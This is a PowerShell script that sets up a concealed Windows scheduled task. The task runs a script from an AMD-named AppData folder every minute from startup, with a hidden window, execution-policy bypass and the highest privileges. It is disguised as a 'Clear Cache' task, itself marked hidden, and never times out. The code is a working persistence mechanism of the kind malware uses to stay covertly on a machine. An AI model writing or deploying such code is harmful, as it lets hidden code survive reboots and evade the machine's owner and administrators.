# Get the current user's SID
$currentUserSid = (New-Object System.Security.Principal.WindowsIdentity).User.Value

# Get the path to the PowerShell executable dynamically
# $powershellPath = Join-Path -Path ([System.Environment]::GetFolderPath('SystemRoot')) -ChildPath "System32\WindowsPowerShell\v1.0\powershell.exe"

$powershellPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

# Get the path to the script dynamically
$scriptPath = Join-Path -Path $env:APPDATA -ChildPath "AMD\ConvertNrun.ps1"

# Define the Action with dynamic paths
$action = New-ScheduledTaskAction -Execute $powershellPath -Argument "-w h -ep Bypass `"$scriptPath`""

# Define the Trigger
$trigger = New-ScheduledTaskTrigger -AtStartup
$trigger.Repetition.Interval = New-TimeSpan -Minutes 1
$trigger.Repetition.Duration = [TimeSpan]::MaxValue  # Keep repeating indefinitely

# Define the Principal with dynamic UserId
$principal = New-ScheduledTaskPrincipal -UserId $currentUserSid -LogonType S4U -RunLevel HighestAvailable

# Define the Settings
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowStartIfOnBatteries $false -StopIfGoingOnBatteries -AllowHardTerminate -StartWhenAvailable $false -RunOnlyIfNetworkAvailable $false -IdleStopOnIdleEnd -IdleRestartOnIdle $false -AllowStartOnDemand -Enabled $true -Hidden $true -RunOnlyIfIdle $false -WakeToRun $false -ExecutionTimeLimit ([TimeSpan]::Zero) -Priority 7 -MultipleInstancesPolicy IgnoreNew

# Register the Scheduled Task
Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -TaskName "Clear Cache" -Description "Task to clear cache on startup."
